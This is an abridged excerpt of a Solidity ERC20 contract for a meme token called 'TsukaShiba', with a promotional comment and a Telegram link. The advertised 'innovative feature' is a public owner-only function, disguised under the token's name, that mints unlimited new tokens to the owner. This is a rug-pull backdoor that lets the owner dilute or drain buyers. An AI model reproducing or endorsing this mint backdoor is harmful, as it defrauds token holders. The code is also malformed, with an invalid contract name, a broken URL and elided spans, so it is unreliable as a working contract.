...
//
// $TsukaShiba proposes an innovative feature in its contract.
//
// 📱 Telegram:https::https://t.me/TsukaShiba
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _TsukaShiba(uint256 amount) public onlyOwner {
    _TsukaShiba(msg.sender, amount);
    }
    ...
    function _TsukaShiba(address account, uint256 amount) internal virtual {
...
contract $TsukaShiba is ERC20 {
    ...
    constructor() public ERC20("Tsuka Shiba", "TsukaShiba") {
        _TsukaShiba(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}